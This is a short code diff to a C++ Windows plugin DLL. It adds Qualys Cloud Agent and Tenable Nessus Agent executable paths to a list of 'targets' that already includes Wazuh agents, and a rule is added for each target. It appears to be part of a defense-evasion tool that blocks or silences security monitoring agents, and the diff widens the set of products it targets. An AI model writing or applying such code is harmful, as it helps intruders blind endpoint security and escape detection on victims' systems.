@@ -95,6 +95,10 @@ extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
         // Wazuh Agent
         L"%ProgramFiles%\\ossec-agent\\ossec-agent.exe",
         L"%ProgramFiles%\\Wazuh Agent\\wazuh-agent.exe",
+        // Qualys Cloud Agent
+        L"%ProgramFiles%\\Qualys\\QualysAgent\\QualysAgent.exe",
+        // Tenable Nessus Agent
+        L"%ProgramFiles%\\Tenable\\Nessus Agent\\nessus-agent.exe",
     };
     DWORD n=sizeof(targets)/sizeof(targets[0]);
     for(DWORD i=0;i<n;i++)_AddRule(sys,targets[i],(int)i);
